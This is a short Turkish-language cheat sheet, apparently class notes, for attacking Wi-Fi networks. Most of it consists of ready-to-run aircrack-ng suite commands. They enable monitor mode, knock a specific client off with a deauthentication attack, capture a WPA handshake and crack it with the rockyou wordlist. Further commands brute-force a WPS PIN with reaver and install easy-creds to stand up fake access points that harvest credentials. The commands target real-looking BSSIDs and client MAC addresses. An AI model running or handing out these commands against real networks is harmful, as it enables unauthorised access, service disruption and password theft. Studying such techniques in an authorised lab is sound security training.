# Wireless
`airmon-ng start wlan0 # monitor mode on wlan0`
`airodump-ng wlan0mon # kablosuz ağları keşfet`
Kablosuz Aga Ait Bilgileri Not Edelim
BSSID = F8:D1:11:40:D2:8E
ESSID = BGAsinif
Channel = 4

```
aireplay-ng --deauth 10 -a F8:D1:11:40:D2:8E -c 78:31:C1:C9:69:94 wlan0mon  # Deauth(Kablosuz ağdan düşürmek) Saldirisi
airodump-ng wlan0mon --bssid F8:D1:11:40:D2:8E --channel 4 -w /tmp/bgasinif # WPA/WPA2 Handshake Elde Etmek / Spesific Bir Kablosuz Agi Dinlemek
aircrack-ng /tmp/bgasinif-01.cap -w /usr/share/wordlists/rockyou.txt # WPA Parolasini Elde Etmek
# WPS Korumali Kablosuz Aglari Kirmak
wash -C -i mon0 # WPS Destekli cihazlari bulmak
reaver -vv -i wlan9mon -b F8:D1:11:40:D2:8E -c 1 -p 39956170 # WPS Pin numarasi denemek ve parolayi elde etmek
```


## Sahte Kablosuz Aglar
Kullanacagimiz script [easy-creds](http://sourceforge.net/projects/easy-creds/files/latest/download)
```
tar zxvf easy*
cd easy*
./install.sh
./easy-creds.sh
1
2
N
```
